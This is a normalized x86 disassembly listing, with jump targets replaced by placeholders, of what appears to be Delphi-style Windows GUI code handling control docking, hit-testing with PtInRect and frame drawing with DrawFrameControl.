mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_451330
mov eax [ ebx + 0x14 ]
call sub_4516c0
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_451ec8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_451648
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_451648
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_451648
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_451214
mov esi eax
mov edx 0x2
mov eax ebx
call sub_451214
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_451648
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_451720
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_451748
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451720
call sub_451ec8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_451748
call sub_451ec8
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_451280
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_451280
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_4520f4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_44c00c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_44bfd0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_416cac
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_452188
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_4520f4
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_451748
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_451994
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_451748
call sub_451ec8
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_452210
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404008
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404654
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_452258
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_452450
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_452928
mov eax [ ebp - 0x8 ]
call sub_451924
xor edx edx
push ebp
push sub_452433
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45243a
mov eax [ ebp - 0x8 ]
call sub_451928
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4510fc
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_452210
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_40348c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_45141c
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_452210
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_448a14
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_4497f4
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403290
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_452460
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_416cd4
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4248b4
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4524b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_423cd4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_424478
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_424418
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_424418
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_423cd4
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_424418
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_424418
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_452540
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_452460
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_4524b8
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_4524b8
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_452460
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_4524b8
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_4524b8
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_45261c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452772
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4476d0
mov eax [ ebp - 0x4 ]
call sub_424450
xor eax eax
push ebp
push sub_452755
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424934
xor eax eax
push ebp
push sub_452738
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_44c00c
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45273f
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424934
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44bfd0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_448494
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_452780
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_44de0c
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_44853c
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_4484f8
mov ecx eax
xor edx edx
xor eax eax
call sub_416cd4
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_44f2dc
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_416cfc
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_4528f4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4528f4
pop ecx
mov eax ebx
call sub_403290
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4528f4
pop ecx
sub_452928
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_4528f4
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403290
xor eax eax
mov [ esi + 0x64 ] eax
sub_452984
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451994
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_4529c0
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4529c0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_452c2d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d38
mov edx [ ebp - 0x8 ]
pop eax
call sub_4042d0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
mov eax [ ebx + 0x14 ]
call sub_451120
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d38
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d38
mov edx [ ebp - 0x10 ]
pop eax
call sub_4042d0
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452c34
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_4514d0
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_451648
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_451684
mov eax [ ebx + 0x18 ]
call sub_4514d0
mov [ edx + 0x18 ] eax
push esi
push sub_4531d0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4519fc
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_451684
mov eax [ esi + 0x64 ]
call sub_451648
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403290
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_4531a8
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403290
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_4511cc
mov edx eax
mov eax edi
call sub_451670
mov eax edi
call sub_4514d0
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_4531d0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4519fc
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_4531d0
mov edx [ eax + 0x14 ]
mov eax esi
call sub_4519fc
mov eax [ ebx + 0x14 ]
call sub_403290
mov eax edi
call sub_403290
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_452c3c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_44de0c
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407df0
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_451670
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_44dd78
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_451670
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_453058
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_4531d0
xor edx edx
mov eax edi
call sub_4519fc
sub_452d18
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_451648
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a9c
mov edx eax
mov eax ebx
call sub_451670
sub_452d54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4044b8
xor eax eax
push ebp
push sub_452dbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov [ ebp - 0x8 ] eax
